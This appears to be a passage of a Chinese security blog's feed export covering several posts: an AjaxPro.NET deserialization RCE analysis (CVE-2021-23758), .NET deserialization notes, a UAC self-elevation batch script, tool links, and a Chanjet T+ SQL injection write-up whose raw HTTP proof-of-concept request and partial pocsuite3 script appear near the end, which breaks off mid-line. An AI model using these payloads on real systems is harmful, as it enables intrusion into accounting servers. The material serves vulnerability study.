title="GetStoreWarehouseByStore"><p>修改请求数据包，加入<code>__type</code>参数，并加入<code>ObjectDataProvider</code>利用链，发送数据包后成功触发RCE。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416162012157.png" class="" title="image-20240416162012157"><p>发送 Ajax 请求后，首先会进入继承于 <code>IHttpHandler</code> 接口的类 <code>AjaxSyncHttpHandler</code>，调用函数 <code>ProcessRequest</code> 进行处理：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416144921138.png" class="" title="ProcessRequest"><p>接着进入<code>XmlHttpRequestProcessor.RetreiveParameters</code>函数：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416145606460.png" class="" title="RetreiveParameters"><p>其中第23行通过<code>method.GetParameters</code>加载自定义的全部Ajax Method，即所有采用<code>[AjaxPro.AjaxMethod]</code>进行装饰的函数，比如本次漏洞的 <code>GetStoreWarehouseByStore</code> 方法：</p><p>上述 parameters 的类型为:</p><p><code>&#123;System.Reflection.RuntimeParameterInfo&#125;System.Reflection.ParameterInfo &#123;System.Reflection.RuntimeParameterInfo&#125;</code></p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150109088.png" class="" title="parameters"><p>自定义的 方法：</p><p>((System.Reflection.RuntimeMethodInfo)parameters[0].MemberImpl).m_name &#x3D; “GetStoreWarehouseByStore”</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150303537.png" class="" title="image-20240416150303537"><p>接着往下走，第120行通过<code>JavaScriptDeserializer.DeserializeFromJson</code>反序列化得到一个<code>JavaScriptObject</code>对象，这里指定了<code>Type</code>类型，继续往下看：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150611131.png" class="" title="DeserializeFromJson"><p>进入 <code>JavaScriptDeserizlizer.Deserializer</code> ：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150859147.png" class="" title="JavaScriptDeserizlizer.Deserializer"><p>这里判断是否存在<code>__type</code>参数，如果存在且通过<code>__type</code>获取的<code>Type</code>对象继承于处理函数输入参数数据类型（<code>type.IsAssignableFrom(t)</code>），可以修改反序列化的<code>type</code>对象。继续往下走，最终调用<code>DeserializeCustomObject</code>函数完成处理，处理过程与.NET JavaScriptSerializer等其他反序列化方式非常类似。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416151403563.png" class="" title="image-20240416151403563"><p>在新版本的 <code>AjaxPro.Net</code> 中，对自定义反序列化类型的操作加入了配置限制，只有预先配置好的<code>Type</code>类型才能进行修改，导致恶意类无法被插入。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240418092602485.png" class="" title="Add Type Check">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述： CVE-2021-23758 Ajax.NET Professional 中的 RCE 反序列化漏洞分析及说明&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="畅捷通" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"/>
    
    
    <category term="POC" scheme="http://example.com/tags/POC/"/>
    
    <category term="漏洞" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>【.Net】反序列化漏洞探索</title>
    <link href="http://example.com/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A2%E7%B4%A2/"/>
    <id>http://example.com/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A2%E7%B4%A2/</id>
    <published>2024-04-15T10:27:03.494Z</published>
    <updated>2024-05-11T09:56:03.752Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：.Net 反序列及漏洞相关自洽记录。</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><h2 id="开源项目和文章推荐"><a href="#开源项目和文章推荐" class="headerlink" title="开源项目和文章推荐"></a>开源项目和文章推荐</h2><p>项目：</p><ol><li><a href="https://github.com/Ivan1ee/NET-Deserialize/tree/master">Ivan1ee&#x2F;NET-Deserialize: 总结了 20+.Net 反序列化文章，持续更新</a></li></ol><p>文章：</p><ol><li><a href="https://cn-sec.com/archives/675298.html">【最新漏洞预警】开源组件漏洞之 CVE-2021-23758 AjaxPro.NET 反序列化漏洞 | CN-SEC 中文网</a></li><li><a href="https://www.h3c.com/cn/d_202112/1519681_30003_0.htm">AjaxPro.NET 反序列化漏洞(CVE-2021-23758)-新华三集团-H3C</a></li></ol><h2 id="反序列化说明"><a href="#反序列化说明" class="headerlink" title="反序列化说明"></a>反序列化说明</h2><p>在 .NET 中，反序列化漏洞通常是由于不安全地处理序列化的数据而产生的。当应用程序反序列化来自不受信任来源的数据时，攻击者可能会构造恶意的序列化数据，从而在反序列化过程中触发任意代码执行或其他恶意行为。</p><p>.NET 框架提供了多种序列化机制，如二进制格式化程序（BinaryFormatter）、SOAP 格式化程序（SoapFormatter）、数据契约序列化程序（DataContractSerializer）等。这些序列化机制在默认情况下可能不安全，因为它们可能允许攻击者利用某些类型的安全漏洞。</p><h2 id="Net-反序列化常见相关函数"><a href="#Net-反序列化常见相关函数" class="headerlink" title=".Net 反序列化常见相关函数"></a>.Net 反序列化常见相关函数</h2><p>目前已经有发现的相关反序列漏洞涉及的函数包括但不限于以下所示相关函数：</p><ol><li>XmlSerializer</li><li>NetDataContractSerializer</li><li>FastJson</li><li>BinaryFormatter</li><li>Json.Net</li><li>.Net Remoting</li><li>SoapFormatter</li><li>DataContractSerializer </li><li>LosFormatter</li><li>ObjectStateFormatter <a href="%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.md">【.Net】可执行文件结构分析.md</a> </li><li>JavaScriptSerializer</li></ol><h2 id="堆栈实例"><a href="#堆栈实例" class="headerlink" title="堆栈实例"></a>堆栈实例</h2><p>可查看文章 <a href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/" title="【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞">【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞</a> 中的分析。关键调用如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type) </span><br><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type) </span><br><span class="line">AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() </span><br><span class="line">AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() </span><br><span class="line">AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：.Net 反序列及漏洞相关自洽记录。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="B_Code" scheme="http://example.com/categories/B-Code/"/>
    
    <category term="CSharp" scheme="http://example.com/categories/B-Code/CSharp/"/>
    
    
    <category term=".Net" scheme="http://example.com/tags/Net/"/>
    
  </entry>
  
  <entry>
    <title>【工具】YaKit 单兵渗透测试工具</title>
    <link href="http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91YaKit%20%E5%8D%95%E5%85%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91YaKit%20%E5%8D%95%E5%85%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</id>
    <published>2024-04-11T16:00:00.000Z</published>
    <updated>2024-04-16T01:32:50.487Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：单兵作战渗透工具介绍——Yakit</p></blockquote><span id="more"></span><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="https://www.yaklang.io/products/download_and_install/#download">下载安装与更新配置 | Yak Program Language</a></p><h2 id="使用探索"><a href="#使用探索" class="headerlink" title="使用探索"></a>使用探索</h2><h3 id="poc-如何使用"><a href="#poc-如何使用" class="headerlink" title="poc 如何使用"></a>poc 如何使用</h3><p>渗透测试同居 -&gt; Web Fuzzer -&gt; 把相应的 POC 代码粘贴到 Request 中，然后店家发送请求即可。</p><img src="/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91YaKit%20%E5%8D%95%E5%85%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20240415105106436.png" class="" title="image-20240415105106436">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：单兵作战渗透工具介绍——Yakit&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="G_工具" scheme="http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="POC" scheme="http://example.com/tags/POC/"/>
    
  </entry>
  
  <entry>
    <title>【批处理】获取 UAC 权限</title>
    <link href="http://example.com/A_OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/%E3%80%90%E6%89%B9%E5%A4%84%E7%90%86%E3%80%91%E8%8E%B7%E5%8F%96uac%E6%9D%83%E9%99%90/"/>
    <id>http://example.com/A_OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/%E3%80%90%E6%89%B9%E5%A4%84%E7%90%86%E3%80%91%E8%8E%B7%E5%8F%96uac%E6%9D%83%E9%99%90/</id>
    <published>2024-04-09T09:37:41.349Z</published>
    <updated>2024-04-12T06:47:24.767Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：批处理获取UAC权限脚本</p></blockquote><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> exist <span class="string">&quot;%SystemRoot%\system32\atl100.dll&quot;</span> (</span><br><span class="line">    ::xcopy atl100.dll D:\ /-y</span><br><span class="line">    ::<span class="built_in">echo</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">        xcopy atl100.dll C:\Windows\System32 /-y </span><br><span class="line">        regsvr32 atl100.dll /n /i</span><br><span class="line">     )</span><br><span class="line"></span><br><span class="line">setlocal</span><br><span class="line"><span class="built_in">set</span> uac=~uac_permission_tmp_%random%</span><br><span class="line">md <span class="string">&quot;%SystemRoot%\system32\%uac%&quot;</span> 2&gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 (</span><br><span class="line">    rd <span class="string">&quot;%SystemRoot%\system32\%uac%&quot;</span> &gt;nul 2&gt;nul ) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span> <span class="built_in">set</span> uac = CreateObject^(<span class="string">&quot;Shell.Application&quot;</span>^)&gt;<span class="string">&quot;%temp%\%uac%.vbs&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> uac.ShellExecute <span class="string">&quot;%~s0&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;runas&quot;</span>,1 &gt;&gt;<span class="string">&quot;%temp%\%uac%.vbs&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> WScript.Quit &gt;&gt;<span class="string">&quot;%temp%\%uac%.vbs&quot;</span></span><br><span class="line">    <span class="string">&quot;%temp%\%uac%.vbs&quot;</span> /f</span><br><span class="line">    del /f /q <span class="string">&quot;%temp%\%uac%.vbs&quot;</span> &amp; <span class="built_in">exit</span> )</span><br><span class="line">endlocal</span><br><span class="line"></span><br><span class="line">:Run</span><br><span class="line">:: 下面代码替换为自己的</span><br><span class="line">regsvr32 <span class="string">&quot;%~dp0%LockKeys.dll&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：批处理获取UAC权限脚本&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="批处理" scheme="http://example.com/categories/A-OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>【WIN】DeskBand 扫盲</title>
    <link href="http://example.com/A_OS/Windows/Shell%E6%89%A9%E5%B1%95/%E3%80%90Win%E3%80%91DeskBand%20%E6%89%AB%E7%9B%B2/"/>
    <id>http://example.com/A_OS/Windows/Shell%E6%89%A9%E5%B1%95/%E3%80%90Win%E3%80%91DeskBand%20%E6%89%AB%E7%9B%B2/</id>
    <published>2024-04-09T09:31:12.470Z</published>
    <updated>2024-04-28T08:53:59.233Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：Windows DeskBand 开发的知识点及项目介绍</p></blockquote><span id="more"></span><p>[toc]</p><h2 id="DeskBand"><a href="#DeskBand" class="headerlink" title="DeskBand"></a>DeskBand</h2><p>DeskBand 指 Windows 操作系统上工具栏按钮，可以通过在工具栏添加按钮来添加一些功能。如下图所示360开发的DeskBand——360U盘助手。</p><img src="/A_OS/Windows/Shell%E6%89%A9%E5%B1%95/%E3%80%90Win%E3%80%91DeskBand%20%E6%89%AB%E7%9B%B2/image-20240409174239559.png" class="" title="image-20240409174239559"><h2 id="开发说明"><a href="#开发说明" class="headerlink" title="开发说明"></a>开发说明</h2><p>参考文章：</p><ul><li><a href="https://blog.csdn.net/leehong2005/article/details/8608783">DeskBand实现之——对象介绍-CSDN博客</a></li></ul><h2 id="如何创建"><a href="#如何创建" class="headerlink" title="如何创建"></a>如何创建</h2><p>开源项目：</p><ul><li><a href="https://github.com/microsoft/Windows-classic-samples/tree/a47da3d4551b74bb8cc1f4c7447445ac594afb44/Samples/Win7Samples/winui/shell/shellextensibility/deskbands">Windows-classic-samples&#x2F;Samples&#x2F;Win7Samples&#x2F;winui&#x2F;shell&#x2F;shellextensibility&#x2F;deskbands at a47da3d4551b74bb8cc1f4c7447445ac594afb44 · microsoft&#x2F;Windows-classic-samples</a></li><li><a href="https://github.com/AzureGreen/NetView?tab=readme-ov-file">AzureGreen&#x2F;NetView: a deskband plus-in which can view real-time net speed</a></li><li><a href="https://github.com/slivermeteor/LockKeys">slivermeteor&#x2F;LockKeys: The windows explorer extension to show the status of Capslock and Numlock in the Taskbar.</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：Windows DeskBand 开发的知识点及项目介绍&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="Shell扩展" scheme="http://example.com/categories/A-OS/Windows/Shell%E6%89%A9%E5%B1%95/"/>
    
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="DeskBand" scheme="http://example.com/tags/DeskBand/"/>
    
  </entry>
  
  <entry>
    <title>【工具】SFTP 工具分享</title>
    <link href="http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91SFTP%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91SFTP%E5%B7%A5%E5%85%B7/</id>
    <published>2024-04-09T06:34:21.903Z</published>
    <updated>2024-04-12T06:47:10.423Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：用户本地搭建 SFTP 的小工具。</p></blockquote><span id="more"></span><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/175JTNcqm1lYkenGoDaRkCA?pwd=hi0w">https://pan.baidu.com/s/175JTNcqm1lYkenGoDaRkCA?pwd=hi0w</a><br>提取码：hi0w</p></blockquote><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><p>参考文章：</p><ul><li><a href="https://developer.aliyun.com/article/1348505#:~:text=%E5%A6%82%E4%BD%95%E5%9C%A8Windows%E6%9C%AC%E5%9C%B0%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BASFTP%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%B9%B6%E9%80%9A%E8%BF%87%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%AE%9E%E7%8E%B0%E5%85%AC%E7%BD%91%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%201%201.%20%E6%90%AD%E5%BB%BASFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%201.1%20%E4%B8%8B%E8%BD%BD%20freesshd%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BD%AF%E4%BB%B6%20%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%EF%BC%9A,%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8A%E8%AE%BF%E9%97%AEcpolar%E7%9A%84%E5%AE%98%E7%BD%91%EF%BC%8C%E5%85%8D%E8%B4%B9%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E8%B4%A6%E5%8F%B7%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8B%E8%BD%BD%E5%B9%B6%E5%AE%89%E8%A3%85windows%E7%89%88%E6%9C%AC%E7%9A%84cpolar%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E3%80%82%20...%204%204.%20%E4%BD%BF%E7%94%A8SFTP%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%8C%E8%BF%9E%E6%8E%A5%E5%85%AC%E7%BD%91%E5%9C%B0%E5%9D%80%E6%B5%8B%E8%AF%95%204.1%20%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%AB%99%E7%82%B9%20">如何在Windows本地快速搭建SFTP文件服务器，并通过端口映射实现公网远程访问-阿里云开发者社区</a></li><li></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：用户本地搭建 SFTP 的小工具。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="G_工具" scheme="http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>【QVD-2023-13612】畅捷通T+ SQL 注入漏洞</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/</id>
    <published>2024-04-07T00:22:33.512Z</published>
    <updated>2024-05-08T03:19:37.036Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：畅捷通T+ SQL 注入漏洞(含POC)</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><p>[toc]</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240418160447555.png" class="" title="image-20240418160447555"><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>畅捷通T+SQL注入漏洞，未经身份认证的远程攻击者可在易受攻击系统上执行任意SQL语句，某些情况下攻击者利用该漏洞可在底层操作系统上执行shell命令。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>畅捷通T+ 13.0</p><p>畅捷通T+ 16.0</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1</span><br><span class="line">Host: 192.168.19.137:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/css,*/*;q=0.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="使用-pocsuit"><a href="#使用-pocsuit" class="headerlink" title="使用 pocsuit"></a>使用 pocsuit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> OrderedDict, OptString</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChanJetPOC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;0&#x27;</span>  <span class="comment"># ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span></span><br><span class="line">    version = <span class="string">&#x27;1&#x27;</span>  <span class="comment"># 默认为1</span></span><br><span class="line">    author = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># PoC作者的大名</span></span><br><span class="line">    vulDate = <span 